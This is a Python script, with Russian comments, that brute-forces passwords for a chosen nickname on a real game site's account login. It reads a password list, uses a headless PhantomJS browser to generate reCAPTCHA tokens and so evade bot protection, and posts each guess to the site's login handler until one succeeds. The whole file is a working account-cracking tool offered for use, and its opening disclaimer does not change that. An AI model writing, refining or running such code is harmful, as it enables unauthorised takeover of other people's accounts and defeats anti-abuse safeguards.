# -*- coding: utf-8 -*-
import aiohttp
import asyncio
import json
import time
import os
import argparse
import platform

from selenium import webdriver
from colorama import init, Fore, Back, Style


# TODO: запуск веб сервера для отображения информации о процессе

async def mainAsync():
	userName = argparse.ArgumentParser()
	userName.add_argument('--nickname', help='set nickname', required=True)
	userName = userName.parse_args()
	userName = userName.nickname

	init()

	print('Разработчик не несет ответсвенности за неправомерное использование данной программы')

	session = aiohttp.ClientSession()

	# Windows
	if os.name == 'nt':
		driver = webdriver.PhantomJS(executable_path=os.path.join(os.path.dirname(__file__), 'resources\\phantomjs.exe'))
		base = open(os.path.join(os.path.dirname(__file__), 'resources\\base'))
		base = base.read()
		base = base.split()
	# Linux
	else:
		resources = os.path.join(os.path.dirname(__file__), 'resources/*')
		os.system(f'chmod 777 {resources}')
		if platform.architecture()[0] == '64bit':
			try:
				driver = webdriver.PhantomJS(executable_path=os.path.join(os.path.dirname(__file__), 'resources/phantomjs'))
			except:
				driver = webdriver.PhantomJS(executable_path=os.path.join(os.path.dirname(__file__), 'resources/phantomjsARM'))
		else:
			driver = webdriver.PhantomJS(executable_path=os.path.join(os.path.dirname(__file__), 'resources/phantomjs32'))
		base = open(os.path.join(os.path.dirname(__file__), 'resources/base'))
		base = base.read()
		base = base.split()
	# TODO: поддержка 32 битных и ARM систем

	driver.get('https://samp-mobile.com/account/')

	startTime = time.time()

	for userPassword in base:
		try:
			id = base.index(userPassword)
			workTime = time.time() - startTime
			workSpeed = id / workTime
		except:
			workSpeed = 0

		attempt = 0

		while True:
			# TODO: получение токена напрямую через логи браузера
			driver.execute_script("grecaptcha.ready(function() {grecaptcha.execute('6LfhuPcUAAAAAPTrbOFLnwQMXDbkTrwDeZ6xodrO', {action: 'homepage'}).then(function(token) {document.getElementById('g-recaptcha-response').value=token;});});")
			g_recaptcha_response = driver.find_element_by_id('g-recaptcha-response')
			g_recaptcha_response = g_recaptcha_response.get_attribute('value')
			if not g_recaptcha_response:
				if os.name == 'nt':
					os.system('cls')
				else:
					os.system('clear')
				print(f'{Back.YELLOW}{Fore.BLACK}Низкая скорость соединения{Style.RESET_ALL}')
				continue
			data = {
				"user_name" : userName,
				"user_password" : userPassword,
				"act" : "account_login",
				"g-recaptcha-response" : g_recaptcha_response
			}
			response = await session.post('https://samp-mobile.com/system/global_classes/Handler.php', data=data)
			response = await response.json()
			status = response['status']
			message = response['message']
			# WTF
			if message == 'Вы не проходите проверку от Google Recaptcha.':
				attempt = attempt + 1
				if attempt == 5:
					driver.get('https://samp-mobile.com/account/')
				continue
			else:
				attempt = 0
				# TODO: запись информации о процессе в файл
				if status == 'ok':
					if os.name == 'nt':
						os.system('cls')
					else:
						os.system('clear')
					print(f'{Back.GREEN}{Fore.BLACK}Верный пароль: {userPassword}\nВремя: {int(workTime)}{Style.RESET_ALL}')
					input()
					exit()
				else:
					if os.name == 'nt':
						os.system('cls')
					else:
						os.system('clear')
					print(f'Текущий пароль: {userPassword}\nВремя: {int(workTime)}\nСкорость: {int(workSpeed)}')
					break

	if os.name == 'nt':
		os.system('cls')
	else:
		os.system('clear')
	print(f'{Back.RED}{Fore.BLACK}Пароль не найден{Style.RESET_ALL}')
	input()
	exit()

# WTF
def main():
	loop = asyncio.get_event_loop()
	loop.run_until_complete(mainAsync())

if __name__ == '__main__':
	main()